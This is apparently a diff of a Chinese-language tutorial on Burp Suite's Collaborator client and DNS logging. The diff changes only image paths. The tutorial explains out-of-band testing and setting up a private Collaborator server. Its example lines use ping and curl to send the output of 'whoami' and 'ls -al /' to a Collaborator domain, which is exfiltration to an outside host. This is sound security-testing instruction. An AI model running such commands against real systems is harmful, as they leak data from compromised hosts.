@@ -14,11 +14,11 @@ dnslog，顾名思义，就是dns服务产生的日志。有什么用呢？我�
 
 **Collaborator client** ，相比Burp中的`proxy`、`instruder`、`scanner`等功能，这个功能可能鲜为人知了吧！启动位置如下图，`Butp`→`Burp Collaborator client`。
 
-![Collaborator](Untitled.assets/1536408720503.png)
+![Collaborator](../images/1536408720503.png)
 
 启动Collaborator client后显示如下页面，burp会分配给我们一个三级域名，点击`Copy to clipbord`可以将域名复制到粘贴板，如`p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net` 。
 
-![1536409490993](Untitled.assets/1536409490993.png)
+![1536409490993](../images/1536409490993.png)
 
 下面举个简单的例子，在Linux shell中执行如下命令：
 
@@ -28,7 +28,7 @@ ping `whoami`.p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net
 
 点击Collaborator client窗口中的Poll now获取dnslog，如下图，在log条目区域显示两条日志，在下面的日志详情中我们看到了从子域名中携带出了`whoami`的执行结果。
 
-![1536409951024](Untitled.assets/1536409951024.png)
+![1536409951024](../images/1536409951024.png)
 
 	
 
@@ -40,7 +40,7 @@ curl p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d "`ls -al /`"
 
 再次点击Collaborator client窗口中的Poll now获取log，我们可以在log区看到一条http日志，我们查看请求原始信息可以看到请求体中携带出了`ls -al /`的执行结果。
 
-![1536410609261](Untitled.assets/1536410609261.png)
+![1536410609261](../images/1536410609261.png)
 
 有没有觉得明文携带这些信息太不安全了？可是使用https安全传送，例如：
 
@@ -58,11 +58,11 @@ curl https://p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d "`ls -al /`"
 	
 然后在客户端配置，以此打开`Project options`→`Misc`→`Burp Collaborator server` ，选择`Use a private Collaborator server` ，在`Server location`中设置服务器域名，没有域名的情况下可以使用IP，如果按IP地址指定服务器，则无法使用依赖于DNS解析的Burp与Collaborator相关的功能。 另外，默认情况下，Burp通过HTTPS轮询Collaborator服务器，并强制实施SSL信任以防止中间人攻击。如果您的Burp实例由于网络或其他限制而无法通过HTTPS直接轮询，您可以选择轮询未加密的HTTP。由于没有配置ssl证书，所以此处勾选`Poll over unencrypted HTTP`即使用未加密的http轮询。详情如下图：
 
-![1536415372083](Untitled.assets/1536415372083.png)
+![1536415372083](../images/1536415372083.png)
 
 最后，我们点击`Run health check...`进行检查，发现部分可功能不可用，如下图：
 
-![1536415454865](Untitled.assets/1536415454865.png)
+![1536415454865](../images/1536415454865.png)
 
 幸运的是，已经可以使用http请求了，使用方法和使用公共Collaborator server时一样，参见本文[0x01]。若要充分利用Collaborator服务器的功能，通常还需要创建合适的[配置文件](https://portswigger.net/burp/documentation/collaborator/deploying#collaborator-configuration-file-format)。
 	
